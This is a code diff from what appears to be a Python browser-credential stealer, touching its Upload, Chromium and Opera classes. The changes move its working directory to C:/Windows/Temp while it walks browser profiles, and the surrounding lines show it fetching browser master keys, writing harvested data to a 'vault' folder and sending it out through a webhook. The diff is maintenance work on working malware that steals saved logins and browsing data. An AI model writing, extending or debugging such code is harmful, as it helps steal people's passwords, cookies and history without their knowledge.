@@ -28,13 +28,13 @@ class Upload:
     def __init__(self, webhook: SyncWebhook):
         self.webhook = webhook
 
-        self.path = os.getcwd()
+        self.mainpath = os.getcwd()
         os.chdir('C:/Windows/Temp')
         self.write_files()
         self.send()
         self.clean()
-        os.chdir(self.path)
-        os.remove('web_history_db')
+        os.chdir(self.mainpath)
+        #os.remove('web_history_db')
     
     def write_files(self):
         os.makedirs("vault", exist_ok=True)
@@ -126,6 +126,9 @@ class Chromium:
             'Profile 5',
         ] 
         
+        self.mainpath = os.getcwd()
+        os.chdir('C:/Windows/Temp')
+        
         for _, path in self.browsers.items():
             if not os.path.exists(path):
                 continue
@@ -151,6 +154,8 @@ class Chromium:
                         operation(path, profile)
                     except Exception as e:
                         pass
+        os.chdir(self.mainpath)
+                
 
     def get_master_key(self, path: str) -> str:
         if not os.path.exists(path):
@@ -278,6 +283,9 @@ class Opera:
             'opera': self.roaming + '\\Opera Software\\Opera Stable'
         }
 
+        self.mainpath = os.getcwd()
+        os.chdir('C:/Windows/Temp')
+        
         for _, path, in self.paths.items():
             if not os.path.exists(path):
                 continue
@@ -299,6 +307,7 @@ class Opera:
                     operation(path)
                 except Exception as e:
                     pass
+        os.chdir(self.mainpath)              
 
     def get_master_key(self, path: str) -> str:
         if not os.path.exists(path):
